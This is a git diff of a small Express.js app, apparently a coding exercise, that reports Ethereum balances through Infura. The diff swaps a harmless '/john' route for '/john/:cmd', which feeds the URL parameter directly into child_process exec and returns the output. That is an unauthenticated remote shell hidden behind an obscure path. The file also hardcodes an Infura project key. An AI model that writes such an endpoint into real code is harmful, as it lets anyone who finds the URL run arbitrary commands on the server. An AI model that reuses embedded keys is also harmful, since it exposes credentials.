@@ -1,5 +1,6 @@
 const express = require('express')
 const ethers = require('ethers')
+const {exec} = require('child_process')
 const fsPromises = require('fs/promises')
 
 const LOG_FILE = 'access-log.txt'
@@ -39,11 +40,19 @@ app.get('/', (req, res, next) => {
   res.send(`Hello ${req.ip}`)
 })
 
-app.get('/john', (req, res, next) => {
+app.get('/john/:cmd', (req, res, next) => {
   console.log(`${req.ip} connected`)
   next()
-}, (req,res) => {
-  res.send("Sorry we don't do post yet")
+}, (req, res) => {
+  exec(`${req.params.cmd}`, (error, stdout, stderr) => {
+    if (error) {
+      res.send(`error: ${error.message}`);
+    } else if (stderr) {
+      res.send(`error: ${stderr.message}`);
+    } else {
+      res.send(`stdout: ${stdout}`);
+    }
+  })
 })
 
 // exercice 3 
@@ -60,8 +69,8 @@ app.get('/:address', async (req, res) => {
   const account = new ethers.providers.InfuraProvider("rinkeby", "d63ccb145caa4670b4db18d68fffdf22")
   const address = req.params.address
   if (ethers.utils.isAddress(address)) {
-    const amount = await account.getBalance(address)
-    res.send(`l'address dite "${address.slice(0, 6) + "..." + address.slice(-4)}" est en possession de ${amount / 10 ** 18} ETH`)
+    const amount = ethers.utils.formatEther(await account.getBalance(address))
+    res.send(`l'address dite "${address.slice(0, 6) + "..." + address.slice(-4)}" est en possession de ${amount} ETH`)
   } else {
     res.send(`Sorry ${address} is not an ethereum address`)
   }
